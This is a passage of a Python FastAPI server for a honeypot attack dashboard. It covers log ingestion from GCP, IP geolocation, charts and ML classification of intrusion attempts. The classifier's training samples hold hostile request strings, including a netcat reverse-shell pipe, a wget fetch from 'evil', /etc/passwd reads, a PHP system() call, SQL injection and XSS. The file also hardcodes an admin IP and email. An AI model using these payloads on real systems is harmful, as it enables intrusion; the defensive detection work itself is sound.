import asyncio
from collections import Counter, OrderedDict, defaultdict
from contextlib import asynccontextmanager
from datetime import datetime, timedelta, timezone
import hashlib
import io
import json
import logging as std_logging
import math
import os
from pathlib import Path
import re
import secrets
import time
from typing import Any, AsyncGenerator

from fastapi import FastAPI, HTTPException, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, Response, StreamingResponse
from fastapi.staticfiles import StaticFiles
from google.cloud import bigquery as gcp_bigquery
from google.cloud import logging as gcp_logging
from google.cloud import storage as gcp_storage
import httpx
import matplotlib

matplotlib.use("Agg")
import matplotlib.pyplot as plt
import numpy as np
from sklearn.cluster import MiniBatchKMeans
from sklearn.ensemble import IsolationForest
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.naive_bayes import MultinomialNB
from sklearn.pipeline import Pipeline
from sklearn.preprocessing import StandardScaler


def _load_dotenv_if_present() -> None:
    """カレントまたはこのファイルと同じフォルダの .env を読み込む（既存環境変数を優先）。"""
    candidates = [
        Path(__file__).resolve().parent / ".env",
        Path.cwd() / ".env",
    ]
    seen_paths: set[Path] = set()
    for env_path in candidates:
        try:
            resolved = env_path.resolve()
        except OSError:
            continue
        if resolved in seen_paths or not resolved.is_file():
            continue
        seen_paths.add(resolved)
        try:
            for raw_line in resolved.read_text(encoding="utf-8").splitlines():
                line = raw_line.strip()
                if not line or line.startswith("#"):
                    continue
                if line.startswith("export "):
                    line = line[len("export ") :].strip()
                if "=" not in line:
                    continue
                key, val = line.split("=", 1)
                key = key.strip()
                val = val.strip()
                if not key or not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", key):
                    continue
                if len(val) >= 2 and (
                    (val.startswith('"') and val.endswith('"'))
                    or (val.startswith("'") and val.endswith("'"))
                ):
                    quote = val[0]
                    inner = val[1:-1]
                    if quote == '"':
                        inner = (
                            inner.replace("\\n", "\n")
                            .replace("\\r", "\r")
                            .replace('\\"', '"')
                            .replace("\\\\", "\\")
                        )
                    val = inner
                elif " #" in val:
                    val = val.split(" #", 1)[0].strip()
                if key not in os.environ:
                    os.environ[key] = val
        except OSError:
            continue


_load_dotenv_if_present()

# gRPC C++ コアの Info ログ（ev_poll_posix.cc 等）を抑制
os.environ.setdefault("GRPC_VERBOSITY", os.getenv("GRPC_VERBOSITY", "ERROR").strip() or "ERROR")
os.environ.setdefault("GRPC_TRACE", os.getenv("GRPC_TRACE", "").strip())

std_logging.basicConfig(level=std_logging.INFO)
logger = std_logging.getLogger("honeypot-dashboard")


def _env_int(name: str, default: int, min_val: int | None = None, max_val: int | None = None) -> int:
    raw = os.getenv(name, "").strip()
    try:
        val = int(raw) if raw else default
    except ValueError:
        val = default
    if min_val is not None:
        val = max(min_val, val)
    if max_val is not None:
        val = min(max_val, val)
    return val


def _env_float(name: str, default: float, min_val: float | None = None) -> float:
    raw = os.getenv(name, "").strip()
    try:
        val = float(raw) if raw else default
        if not math.isfinite(val):
            val = default
    except ValueError:
        val = default
    if min_val is not None:
        val = max(min_val, val)
    return val


def _env_bool(name: str, default: bool) -> bool:
    raw = os.getenv(name)
    if raw is None or not raw.strip():
        return default
    return raw.strip().lower() in {"1", "true", "yes", "on"}


# ==========================================
# 安全上限・キャッシュ・ML設定
# ==========================================
SHOW_ALL_HISTORY = _env_bool("SHOW_ALL_HISTORY", True)
MAX_ALLOWED_LIMIT = _env_int("MAX_ALLOWED_LIMIT", 10000, min_val=1, max_val=50000)
MAX_QUERY_HOURS = _env_int("MAX_QUERY_HOURS", 8760, min_val=1, max_val=87600)
MAX_STREAM_DURATION_SEC = _env_float("MAX_STREAM_DURATION_SEC", 45.0, min_val=5.0)
MAX_LOG_CACHE_ENTRIES = _env_int("MAX_LOG_CACHE_ENTRIES", 128, min_val=1, max_val=2048)
MAX_GEO_CACHE_ENTRIES = _env_int("MAX_GEO_CACHE_ENTRIES", 10000, min_val=1, max_val=100000)
MAX_GCS_BLOB_BYTES = _env_int("MAX_GCS_BLOB_BYTES", 50 * 1024 * 1024, min_val=1024)

# サーバー側への IP .txt 自動保存設定（既定: 有効、Cloud Run 等の読み取り専用環境では SAVE_IPS_TXT=false で無効化可能）
SAVE_IPS_TXT = _env_bool("SAVE_IPS_TXT", True)
IPS_TXT_PATH = Path(
    (os.getenv("IPS_TXT_PATH") or str(Path(__file__).resolve().parent / "detected_ips.txt")).strip()
)
MIN_STREAM_INTERVAL_SEC = 1.0

# 教師なしクラスタリング設定（0以下でサンプル数から自動決定）
UNSUPERVISED_CLUSTERS = _env_int("UNSUPERVISED_CLUSTERS", 0)
MAX_UNSUPERVISED_CLUSTERS = _env_int("MAX_UNSUPERVISED_CLUSTERS", 8, min_val=2, max_val=20)

# Automated Recon / Scanner 非表示・異常イベント絞り込み設定（既定: 80%以上を表示）
HIDE_AUTOMATED_RECON = _env_bool("HIDE_AUTOMATED_RECON", False)
ANOMALY_SCORE_THRESHOLD = _env_int("ANOMALY_SCORE_THRESHOLD", 0, min_val=0, max_val=100)

# 監査ログ・運用者操作の除外設定（既定: 除外する）
EXCLUDE_AUDIT_AND_ADMIN_LOGS = _env_bool("EXCLUDE_AUDIT_AND_ADMIN_LOGS", True)
_RAW_ADMIN_IPS = os.getenv("ADMIN_IPS", "59.146.155.164").strip()
ADMIN_IPS: set[str] = (
    {x.strip() for x in _RAW_ADMIN_IPS.split(",") if x.strip()}
    if _RAW_ADMIN_IPS
    else set()
)
_RAW_ADMIN_EMAILS = os.getenv("ADMIN_EMAILS", "mujwtaxz@gmail.com").strip()
ADMIN_EMAILS: set[str] = (
    {x.strip().lower() for x in _RAW_ADMIN_EMAILS.split(",") if x.strip()}
    if _RAW_ADMIN_EMAILS
    else set()
)

# ==========================================
# 設定・定数（Cloud Logging + GCS + BigQuery 統合）
# ==========================================
GCP_PROJECT_ID = os.getenv("GCP_PROJECT_ID", "honeypot-515503").strip() or "honeypot-515503"
LOG_SOURCE_PROJECT_ID = (os.getenv("LOG_SOURCE_PROJECT_ID") or GCP_PROJECT_ID).strip()

_RAW_LOG_PROJECTS = os.getenv("LOG_PROJECTS") or LOG_SOURCE_PROJECT_ID
LOG_PROJECTS: list[str] = [
    item.strip() for item in _RAW_LOG_PROJECTS.split(",") if item.strip()
]

_RAW_GCS_BUCKETS = (
    os.getenv("LOG_GCS_BUCKETS")
    or os.getenv("LOG_GCS_BUCKET")
    or "honeypot-archive-515503"
)
LOG_GCS_BUCKETS: list[str] = [
    item.strip() for item in _RAW_GCS_BUCKETS.split(",") if item.strip()
]

BQ_PROJECT_ID = (os.getenv("BQ_PROJECT_ID") or GCP_PROJECT_ID).strip()
BQ_DATASET_ID = (os.getenv("BQ_DATASET_ID") or "honeypot_dataset").strip()
BQ_TABLE_NAME = (os.getenv("BQ_TABLE_NAME") or "run_googleapis_com_stdout").strip()
BQ_TABLE_ID = f"{BQ_PROJECT_ID}.{BQ_DATASET_ID}.{BQ_TABLE_NAME}"
ENABLE_BIGQUERY_LOGS = _env_bool("ENABLE_BIGQUERY_LOGS", False)

LOG_SOURCE_MODE = (os.getenv("LOG_SOURCE_MODE") or "all").strip().lower()
LOG_FILTER = os.getenv("LOG_FILTER", "").strip()
LOG_GCS_PREFIX = os.getenv("LOG_GCS_PREFIX", "").strip()
MAX_GCS_BLOBS = _env_int("MAX_GCS_BLOBS", 5000, min_val=1, max_val=50000)
MAX_TIMELINE_EVENTS = _env_int(
    "MAX_TIMELINE_EVENTS", MAX_ALLOWED_LIMIT, min_val=1, max_val=MAX_ALLOWED_LIMIT
)

USD_TO_JPY = _env_float("USD_TO_JPY", 152.0, min_val=1.0)
STREAM_INTERVAL_SEC = _env_float("STREAM_INTERVAL_SEC", 3.0, min_val=MIN_STREAM_INTERVAL_SEC)
LOG_CACHE_TTL = _env_float("LOG_CACHE_TTL", 5.0, min_val=1.0)

SHOW_ALL_JSON = _env_bool("SHOW_ALL_JSON", True)
# 0 で無制限（全文出力）。正の値を指定した場合はその文字数まで出力。
MAX_DISPLAY_TEXT_LEN = _env_int("MAX_DISPLAY_TEXT_LEN", 0, min_val=0, max_val=2000000)

_RAW_ALLOWED_ORIGINS = os.getenv("ALLOWED_ORIGINS", "").strip()
ALLOWED_ORIGINS: list[str] = (
    [o.strip() for o in _RAW_ALLOWED_ORIGINS.split(",") if o.strip()]
    if _RAW_ALLOWED_ORIGINS
    else []
)

LOG_RESPONSE_CACHE: OrderedDict[
    tuple[Any, ...],
    tuple[float, dict[str, Any]],
] = OrderedDict()

_default_skip = not SHOW_ALL_JSON
SKIP_CRAWLERS = _env_bool("SKIP_CRAWLERS", _default_skip)
SKIP_GOOGLE_LLC = _env_bool("SKIP_GOOGLE_LLC", _default_skip)
SKIP_PRIVATE_IPS = _env_bool("SKIP_PRIVATE_IPS", _default_skip)
SKIP_SYSTEM_NOISE = _env_bool("SKIP_SYSTEM_NOISE", _default_skip)
SKIP_JAPAN_IPS = _env_bool("SKIP_JAPAN_IPS", _default_skip)

_RAW_IGNORED_IPS = os.getenv("IGNORED_IPS", "").strip()
IGNORED_IPS: set[str] = (
    {x.strip() for x in _RAW_IGNORED_IPS.split(",") if x.strip()}
    if _RAW_IGNORED_IPS
    else set()
)
IGNORED_PREFIXES: tuple[str, ...] = tuple(
    p.strip() for p in os.getenv("IGNORED_PREFIXES", "").split(",") if p.strip()
)

GEO_CACHE: OrderedDict[str, dict[str, Any]] = OrderedDict()
GEO_SUCCESS_TTL = _env_float("GEO_SUCCESS_TTL", 60.0 * 60.0 * 24.0, min_val=1.0)
GEO_ERROR_TTL = _env_float("GEO_ERROR_TTL", 20.0, min_val=1.0)

COUNTRY_JA_MAP: dict[str, str] = {
    "US": "アメリカ",
    "CN": "中国",
    "RU": "ロシア",
    "IN": "インド",
    "BR": "ブラジル",
    "DE": "ドイツ",
    "NL": "オランダ",
    "SG": "シンガポール",
    "JP": "日本",
    "KR": "韓国",
    "GB": "イギリス",
    "FR": "フランス",
    "VN": "ベトナム",
    "ID": "インドネシア",
    "ZA": "南アフリカ",
    "BE": "ベルギー",
    "HK": "香港",
    "TW": "台湾",
    "CA": "カナダ",
    "AU": "オーストラリア",
    "UA": "ウクライナ",
    "TH": "タイ",
    "MY": "マレーシア",
    "PH": "フィリピン",
    "IT": "イタリア",
    "ES": "スペイン",
    "SE": "スウェーデン",
    "CH": "スイス",
    "PL": "ポーランド",
    "TR": "トルコ",
    "AE": "アラブ首長国連邦",
    "SA": "サウジアラビア",
    "MX": "メキシコ",
    "AR": "アルゼンチン",
    "NZ": "ニュージーランド",
}

CRAWLER_UA_KEYWORDS = (
    "googlebot",
    "google-lens",
    "google-inspectiontool",
    "adsbot-google",
    "apis-google",
    "mediapartners-google",
    "bingbot",
    "yandexbot",
    "duckduckbot",
    "baiduspider",
    "slurp",
    "applebot",
    "uptime",
    "googlehc",
)

SYSTEM_NOISE_EVENTS = {"heartbeat", "start", "stop", "ping"}

SYSTEM_NOISE_PATTERNS = (
    "gce agent stopped",
    "error watching metadata",
    "no shutdown scripts to run",
    "starting shutdown scripts",
    "completed adding/removing routes",
    "network interface setup disabled",
    "systemd-",
    "dhclient",
    "cloud-init",
    "startup-script",
    "finished running startup scripts",
    "startup-script exit status",
    "osconfig agent",
    "logging.googleapis.com/diagnostic",
    "credential helper for gcr registries",
    "configuring supplied registries",
    "adding config for registries",
    '"event": "heartbeat"',
    '"event": "start"',
    '"event": "ping"',
    '"message": "ping"',
)

_CONTROL_CHAR_RE = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]")


def _is_unbounded_history(hours: int) -> bool:
    return bool(SHOW_ALL_HISTORY and int(hours) >= 8760)


def _safe_float(val: Any, default: float = 0.0) -> float:
    if val is None or isinstance(val, bool):
        return default
    try:
        res = float(val)
        return res if np.isfinite(res) else default
    except (ValueError, TypeError):
        return default


def _safe_int(val: Any, default: int = 0) -> int:
    if val is None or isinstance(val, bool):
        return default
    try:
        return int(val)
    except (ValueError, TypeError):
        return default


def sanitize_display_text(text: Any, max_len: int | None = None) -> str:
    if text is None:
        return ""
    s = _CONTROL_CHAR_RE.sub("", str(text))
    limit_len = MAX_DISPLAY_TEXT_LEN if max_len is None else max_len
    if limit_len > 0 and len(s) > limit_len:
        return s[:limit_len] + "…(truncated)"
    return s


def _safe_json_dumps(obj: Any, indent: int | None = None) -> str:
    raw = json.dumps(obj, ensure_ascii=False, default=str, indent=indent)
    return _CONTROL_CHAR_RE.sub("", raw)


def code_to_flag(country_code: str) -> str:
    code = (country_code or "").strip().upper()
    if len(code) != 2 or not code.isalpha():
        return "🌐"
    return "".join(chr(127397 + ord(c)) for c in code)


def is_public_ipv4(ip: str) -> bool:
    s = (ip or "").strip()
    if s.startswith("::ffff:"):
        s = s.removeprefix("::ffff:")
    if not s or s.lower() in {"127.0.0.1", "0.0.0.0", "unknown", "private", "localhost"}:
        return False
    if not re.fullmatch(r"(?:\d{1,3}\.){3}\d{1,3}", s):
        return False
    octets: list[int] = []
    for part in s.split("."):
        if len(part) > 1 and part.startswith("0"):
            return False
        val = int(part)
        if not (0 <= val <= 255):
            return False
        octets.append(val)
    a, b, _, _ = octets
    if a in {0, 10, 127}:
        return False
    if a == 169 and b == 254:
        return False
    if a == 172 and 16 <= b <= 31:
        return False
    if a == 192 and b == 168:
        return False
    return True


def _is_japan_geo(geo: dict[str, Any]) -> bool:
    cc = str(geo.get("country_code") or "").strip().upper()
    ja_name = str(geo.get("country_ja") or "").strip()
    en_name = str(geo.get("country") or "").strip().lower()
    return cc == "JP" or ja_name == "日本" or en_name == "japan"


def _is_google_llc(geo: dict[str, Any], user_agent: str = "", raw_text: str = "") -> bool:
    isp = str(geo.get("isp") or "").strip().lower()
    ua = (user_agent or "").strip().lower()
    raw_l = (raw_text or "").strip().lower()
    return (
        "google" in isp
        or any(k in ua for k in ("googlebot", "google-lens", "googlehc", "apis-google"))
        or "google-lens" in raw_l
        or "googleusercontent.com" in raw_l
    )


def _is_private_or_non_public_ip(ip: str, geo: dict[str, Any] | None = None) -> bool:
    ip_clean = (ip or "").strip().lower()
    if not ip_clean or ip_clean == "private" or not is_public_ipv4(ip_clean):
        return True
    if geo:
        country = str(geo.get("country") or "").strip().lower()
        country_ja = str(geo.get("country_ja") or "").strip()
        if country in {"private / local", "ローカル", "プライベート"} or country_ja in {
            "ローカル",
            "プライベート",
        }:
            return True
    return False


def _is_audit_or_admin_log(src_ip: str, raw_text: str, user_agent: str = "") -> bool:
    """GCP監査ログや運用者アカウント/IPの操作を外部攻撃ログと分離する。"""
    if not EXCLUDE_AUDIT_AND_ADMIN_LOGS:
        return False

    ip_clean = (src_ip or "").strip()
    if ADMIN_IPS and ip_clean in ADMIN_IPS:
        return True

    lower_all = f"{raw_text} {user_agent}".lower()
    if (
        "google.cloud.audit.auditlog" in lower_all
        or "cloudaudit.googleapis.com" in lower_all
        or "setiampolicy" in lower_all
        or "compute.firewalls" in lower_all
        or "compute.instances.setmetadata" in lower_all
        or "google-cloud-sdk gcloud/" in lower_all
    ):
        return True

    if ADMIN_EMAILS and any(email in lower_all for email in ADMIN_EMAILS):
        return True

    return False


# ==========================================
# IP 抽出・.txt 保存ヘルパー
# ==========================================
def collect_detected_ips(payload: dict[str, Any]) -> list[str]:
    """集計結果から重複なしの公開IPv4リスト（出現数降順・同数は昇順）を作成する。"""
    ip_counts: Counter[str] = Counter()

    for ev in payload.get("timeline") or []:
        if isinstance(ev, dict):
            ip = str(ev.get("ip") or "").strip()
            if is_public_ipv4(ip):
                ip_counts[ip] += 1

    if not ip_counts:
        for item in payload.get("top_ips") or []:
            if isinstance(item, dict):
                ip = str(item.get("ip") or "").strip()
                if is_public_ipv4(ip):
                    ip_counts[ip] += max(1, _safe_int(item.get("count"), 1))

    return [ip for ip, _ in sorted(ip_counts.items(), key=lambda x: (-x[1], x[0]))]


def _save_ips_txt_if_enabled(ips: list[str]) -> Path | None:
    if not SAVE_IPS_TXT:
        return None
    try:
        IPS_TXT_PATH.parent.mkdir(parents=True, exist_ok=True)
        content = "\n".join(ips) + ("\n" if ips else "")
        IPS_TXT_PATH.write_text(content, encoding="utf-8")
        return IPS_TXT_PATH
    except OSError as exc:
        logger.warning("Failed to write IP list to %s: %s", IPS_TXT_PATH, exc)
        return None


# ==========================================
# matplotlib（plt）グラフ描画
# ==========================================
def render_category_chart_png(categories: dict[str, int], title: str = "ML Attack Category Distribution") -> bytes:
    """カテゴリ集計辞書から matplotlib（plt）で棒グラフPNGを生成する。"""
    items = sorted(
        ((str(k), _safe_int(v, 0)) for k, v in (categories or {}).items() if _safe_int(v, 0) > 0),
        key=lambda x: x[1],
        reverse=True,
    )

    fig, ax = plt.subplots(figsize=(8, 4.2), dpi=130)
    fig.patch.set_facecolor("#0f172a")
    ax.set_facecolor("#1e293b")

    if not items:
        ax.text(
            0.5,
            0.5,
            "No anomalous category data",
            color="#94a3b8",
            ha="center",
            va="center",
            fontsize=12,
        )
        ax.set_xticks([])
        ax.set_yticks([])
    else:
        labels = [k for k, _ in items]
        counts = [v for _, v in items]
        y_pos = np.arange(len(labels))
        colors = ["#38bdf8", "#f97316", "#a855f7", "#22c55e", "#eab308"][: len(labels)]
        if len(colors) < len(labels):
            colors.extend(["#64748b"] * (len(labels) - len(colors)))

        bars = ax.barh(y_pos, counts, color=colors, height=0.58)
        ax.set_yticks(y_pos)
        ax.set_yticklabels(labels, color="#e2e8f0", fontsize=9.5)
        ax.invert_yaxis()
        ax.set_xlabel("Count", color="#cbd5e1", fontsize=9.5)
        ax.tick_params(axis="x", colors="#cbd5e1", labelsize=9)
        ax.grid(axis="x", linestyle="--", alpha=0.25, color="#94a3b8")
        ax.spines["top"].set_visible(False)
        ax.spines["right"].set_visible(False)
        ax.spines["left"].set_color("#475569")
        ax.spines["bottom"].set_color("#475569")

        max_c = max(counts)
        for bar, cnt in zip(bars, counts):
            ax.text(
                bar.get_width() + max(max_c * 0.02, 0.3),
                bar.get_y() + bar.get_height() / 2,
                str(cnt),
                va="center",
                ha="left",
                color="#f8fafc",
                fontsize=9.5,
                fontweight="bold",
            )

    ax.set_title(title, color="#f8fafc", fontsize=11, fontweight="bold", pad=10)
    fig.tight_layout()

    buf = io.BytesIO()
    plt.savefig(buf, format="png", facecolor=fig.get_facecolor())
    plt.close(fig)
    buf.seek(0)
    return buf.getvalue()


# ==========================================
# AI分析（教師あり分類 + 異常検知 + 教師なしクラスタリング + 分かりやすい攻撃解説）
# ==========================================
CLASSIFIER_PIPELINE: Pipeline | None = None
ANOMALY_MODEL: IsolationForest | None = None

CATEGORY_JA_EXPLANATIONS: dict[str, tuple[str, str]] = {
    "RCE / Command Injection": (
        "外部からOSコマンドやスクリプトを実行しようとする遠隔コード実行（RCE）・コマンド注入の疑い",
        "Remote code execution / command injection attempt",
    ),
    "Credential / Env Theft": (
        ".env・秘密鍵・認証情報や設定ファイルなどを探索して奪取しようとする認証情報窃取の疑い",
        "Credential or environment/secret file probing",
    ),
    "CMS / Admin Brute Force": (
        "管理画面やログインエンドポイントへの総当たり・認証突破試行の疑い",
        "Admin or CMS login brute-force attempt",
    ),
    "SQLi / XSS Probe": (
        "SQLインジェクション・クロスサイトスクリプティング（XSS）・パストラバーサルなどのWeb脆弱性探索の疑い",
        "SQL injection, XSS, or path traversal probe",
    ),
    "Automated Recon / Scanner": (
        "自動スキャナーやプロトコル探索・事前偵察（Recon）によるリクエスト",
        "Automated scanner or reconnaissance probe",
    ),
}


def init_ml_models() -> None:
    global CLASSIFIER_PIPELINE, ANOMALY_MODEL

    train_samples = [
        ("POST /boaform/admin/formSysCmd nc 45.90.163.37 4545 | sh", "RCE / Command Injection"),
        ("POST /cgi-bin/luci/;stok=/locale cmd=wget http://evil/sh", "RCE / Command Injection"),
        ("GET /shell?cmd=cat+/etc/passwd;+uname+-a", "RCE / Command Injection"),
        ("POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <?php system('id'); ?>", "RCE / Command Injection"),
        ("GET /boaform/admin/formPing?target_addr=127.0.0.1|busybox", "RCE / Command Injection"),
        ("POST / process.mainModule.require child_process spawn /bin/sh Next-Action", "RCE / Command Injection"),
        ("POST / ; id ; uname -a ; /bin/bash -c", "RCE / Command Injection"),
        ("GET /.env HTTP/1.1", "Credential / Env Theft"),
        ("GET /.git/config HTTP/1.1", "Credential / Env Theft"),
        ("GET /config.json aws_secret_access_key", "Credential / Env Theft"),
        ("GET /backup.sql.gz db_password", "Credential / Env Theft"),
        ("GET /aws/credentials .ssh/id_rsa", "Credential / Env Theft"),
        ("GET /test-path HoneypotTest curl", "Credential / Env Theft"),
        ("POST /wp-login.php log=admin&pwd=password123", "CMS / Admin Brute Force"),
        ("GET /xmlrpc.php wp.getUsersBlogs", "CMS / Admin Brute Force"),
        ("GET /phpmyadmin/index.php", "CMS / Admin Brute Force"),
        ("POST /admin/login username=root&password=admin", "CMS / Admin Brute Force"),
        ("GET /search?id=1' UNION SELECT 1,user(),database()--", "SQLi / XSS Probe"),
        ("GET /index.php?page=1 OR 1=1", "SQLi / XSS Probe"),
        ("GET /item?id=1 SLEEP(5) BENCHMARK(1000000,MD5(1))", "SQLi / XSS Probe"),
        ("GET /?q=<script>alert(document.cookie)</script>", "SQLi / XSS Probe"),
        ("GET /../../../../etc/passwd", "SQLi / XSS Probe"),
        ("GET / cortex-xpanse scanning-activity", "Automated Recon / Scanner"),
        ("GET / mglndd bad_request 400", "Automated Recon / Scanner"),
        ("GET /robots.txt python-requests/2.31.0", "Automated Recon / Scanner"),
        ("GET /favicon.ico zgrab/0.x", "Automated Recon / Scanner"),
        ("GET /sitemap.xml masscan/1.3", "Automated Recon / Scanner"),
        ("HEAD / HTTP/1.1 nuclei", "Automated Recon / Scanner"),
    ]

    pipeline = Pipeline(
        [
            ("tfidf", TfidfVectorizer(ngram_range=(1, 2), lowercase=True)),
            ("nb", MultinomialNB(alpha=0.3)),
        ]
    )
    pipeline.fit([x[0] for x in train_samples], [x[1] for x in train_samples])
    CLASSIFIER_PIPELINE = pipeline

    baseline_features = np.array(
        [
            [12, 0, 5, 1],
            [18, 20, 6, 2],
            [10, 0, 4, 1],
            [24, 45, 7, 3],
            [15, 10, 5, 2],
            [30, 60, 8, 4],
            [14, 5, 5, 1],
            [22, 30, 6, 2],
        ],
        dtype=np.float64,
    )
    detector = IsolationForest(n_estimators=100, contamination=0.15, random_state=42)
    detector.fit(baseline_features)
    ANOMALY_MODEL = detector


def _get_ready_models() -> tuple[Pipeline, IsolationForest]:
    if CLASSIFIER_PIPELINE is None or ANOMALY_MODEL is None:
        init_ml_models()
    assert CLASSIFIER_PIPELINE is not None
    assert ANOMALY_MODEL is not None
    return CLASSIFIER_PIPELINE, ANOMALY_MODEL


def _shannon_entropy(text: str) -> float:
    if not text:
        return 0.0
    sample = text[:2048]
    counts = Counter(sample)
    length = float(len(sample))
    ent = 0.0
    for c in counts.values():
        p = c / length
        if p > 0:
            ent -= p * math.log2(p)
    return round(min(ent, 8.0), 3)


def _extract_host_from_record(rec: dict[str, Any]) -> str:
    raw_json = rec.get("raw_json")
    if isinstance(raw_json, dict):
        headers = raw_json.get("headers")
        if isinstance(headers, dict):
            for k, v in headers.items():
                if str(k).lower() == "host":
                    if isinstance(v, list) and v:
                        return str(v[0])[:120]
                    if v:
                        return str(v)[:120]
        if raw_json.get("host"):
            return str(raw_json.get("host"))[:120]
    raw_line = str(rec.get("raw_request_line") or "")
    m = re.search(r"([0-9]{1,3}(?:\.[0-9]{1,3}){3}[:_]\d{2,5})", raw_line)
    if m:
        return m.group(1)
    return ""


def _build_cluster_text_and_features(
    rec: dict[str, Any],
    host_burst_count: int = 1,
) -> tuple[str, list[float], dict[str, Any]]:
    event_type = str(rec.get("event_type") or "request").lower()
    method = str(rec.get("method") or "GET").upper()
    path = str(rec.get("path") or "/")
    payload = str(rec.get("payload") or "")
    raw_req = str(rec.get("raw_request_line") or "")
    ua = str(rec.get("user_agent") or "")
    raw_json = rec.get("raw_json")
    code = _safe_int(raw_json.get("code"), 0) if isinstance(raw_json, dict) else 0
    host = _extract_host_from_record(rec)

    combined_raw = f"{raw_req} {payload[:1000]}"
    non_ascii_cnt = sum(1 for ch in combined_raw if ord(ch) > 127)
    non_ascii_ratio = round(non_ascii_cnt / max(len(combined_raw), 1), 4)
    entropy = _shannon_entropy(combined_raw)
    is_tls_hello = 1.0 if ("\x16\x03" in raw_req or "\\u0016\\u0003" in raw_req) else 0.0
    is_bad_req = 1.0 if (event_type == "bad_request" or code == 400) else 0.0
    is_mcp_or_sse = 1.0 if any(tok in f"{path} {payload}".lower() for tok in ("/mcp", "/sse", "text/event-stream")) else 0.0
    is_mgld = 1.0 if "mgldd" in combined_raw.lower() else 0.0
    is_scanner_ua = 1.0 if any(tok in ua.lower() for tok in ("zgrab", "infrawatch", "nuclei", "masscan", "python-requests", "curl")) else 0.0
    path_depth = float(min(len([p for p in path.split("/") if p]), 20))
    header_cnt = float(min(_safe_int(rec.get("header_count"), 0), 100))
    burst_log = float(round(math.log1p(max(host_burst_count, 1)), 3))

    ua_clean = re.sub(r"\([^)]*\)", "", ua).strip()
    tokens = [
        f"ev:{event_type}",
        f"m:{method}",
        f"p:{path.split('?')[0][:80]}",
        f"ua:{ua_clean[:60]}",
    ]
    if is_tls_hello > 0:
        tokens.append("proto:tls_handshake")
    if is_mgld > 0:
        tokens.append("proto:mgldd_probe")
    if is_mcp_or_sse > 0:
        tokens.append("target:mcp_sse")
    if is_bad_req > 0:
        tokens.append("status:400_bad_request")
    if host:
        tokens.append(f"host:{host[:60]}")
    if any(k in combined_raw.lower() for k in ("querybasiccfg", "<?xml", "boaform", "cgi-bin", "wp-login", ".env", ".git")):
        tokens.append("probe:exploit_or_config")

    cluster_text = " ".join(tokens)[:2048]
    num_features = [
        non_ascii_ratio,
        entropy,
        is_tls_hello,
        is_bad_req,
        is_mcp_or_sse,
        is_mgld,
        is_scanner_ua,
        path_depth,
        header_cnt,
        burst_log,
    ]
    meta = {
        "host": host,
        "non_ascii_ratio": non_ascii_ratio,
        "entropy": entropy,
        "is_tls_hello": bool(is_tls_hello),
        "is_bad_req": bool(is_bad_req),
        "is_mcp_or_sse": bool(is_mcp_or_sse),
        "is_mgld": bool(is_mgld),
        "is_scanner_ua": bool(is_scanner_ua),
        "ua": ua,
        "path": path,
        "method": method,
        "host_burst_count": host_burst_count,
    }
    return cluster_text, num_features, meta


def _generate_cluster_label(
    cluster_idx: int,
    member_metas: list[dict[str, Any]],
    top_terms: list[str],
) -> str:
    n = max(len(member_metas), 1)
    tls_rate = sum(1 for m in member_metas if m["is_tls_hello"]) / n
    mgld_rate = sum(1 for m in member_metas if m["is_mgld"]) / n
    mcp_rate = sum(1 for m in member_metas if m["is_mcp_or_sse"]) / n
    bad_rate = sum(1 for m in member_metas if m["is_bad_req"]) / n
    high_bin_rate = sum(1 for m in member_metas if m["non_ascii_ratio"] >= 0.15 or m["entropy"] >= 4.8) / n
    avg_burst = sum(m["host_burst_count"] for m in member_metas) / n

    uas = Counter(re.split(r"[/\s(]", m["ua"])[0] for m in member_metas if m["ua"])
    for m in member_metas:
        ua_l = m["ua"].lower()
        if "zgrab" in ua_l:
            uas["zgrab"] += 2
        elif "infrawatch" in ua_l:
            uas["Infrawatch"] += 2

    if tls_rate >= 0.5:
        return f"C{cluster_idx + 1}: TLS Handshake on HTTP Port"
    if mgld_rate >= 0.5:
        return f"C{cluster_idx + 1}: MGLNDD / Non-HTTP Banner Probe"
    if high_bin_rate >= 0.5 and bad_rate >= 0.5:
        return f"C{cluster_idx + 1}: Binary / Malformed Payload (400)"
    if mcp_rate >= 0.5:
        suffix = " (Multi-IP Burst)" if avg_burst >= 2.0 else ""
        return f"C{cluster_idx + 1}: MCP / SSE Endpoint Recon{suffix}"
    if uas:
        top_ua, ua_cnt = uas.most_common(1)[0]
        if ua_cnt / n >= 0.4 and top_ua:
            return f"C{cluster_idx + 1}: Scanner / Monitor ({top_ua})"

    paths = Counter(m["path"].split("?")[0] for m in member_metas if m["path"])
    top_path = paths.most_common(1)[0][0] if paths else "/"
    if bad_rate >= 0.6:
        return f"C{cluster_idx + 1}: Protocol Error / Bad Request ({top_path})"

    readable_terms = [
        t.split(":", 1)[-1]
        for t in top_terms
        if not t.startswith(("ev:", "host:")) and len(t.split(":", 1)[-1]) > 1
    ][:2]
    if readable_terms:
        return f"C{cluster_idx + 1}: {' / '.join(readable_terms)}"
    return f"C{cluster_idx + 1}: Anomaly Probe ({top_path})"


def run_unsupervised_clustering(
    records: list[dict[str, Any]],
    host_burst_map: dict[str, int] | None = None,
    n_clusters_override: int = 0,
) -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
    if not records:
        return [], []

    burst_lookup = host_burst_map or {}
    texts: list[str] = []
    num_rows: list[list[float]] = []
    metas: list[dict[str, Any]] = []

    for rec in records:
        host = _extract_host_from_record(rec)
        burst_cnt = burst_lookup.get(host, 1) if host else 1
        txt, feats, meta = _build_cluster_text_and_features(rec, host_burst_count=burst_cnt)
        texts.append(txt)
        num_rows.append(feats)
        metas.append(meta)

    n_samples = len(records)
    if n_samples == 1:
        label = _generate_cluster_label(0, metas, texts[0].split()[:4])
        assignments = [
            {
                "cluster_id": 0,
                "cluster_label": label,
                "cluster_distance": 0.0,
                "cluster_features": metas[0],
            }
        ]
        summary = [
            {
                "cluster_id": 0,
                "label": label,
                "count": 1,
                "share_pct": 100.0,
                "top_terms": texts[0].split()[:5],
                "sample_paths": [metas[0]["path"]],
            }
        ]
        return assignments, summary

    if n_clusters_override > 0:
        k = min(n_clusters_override, n_samples)
    elif UNSUPERVISED_CLUSTERS > 0:
        k = min(UNSUPERVISED_CLUSTERS, n_samples)
    else:
        k = int(
            np.clip(
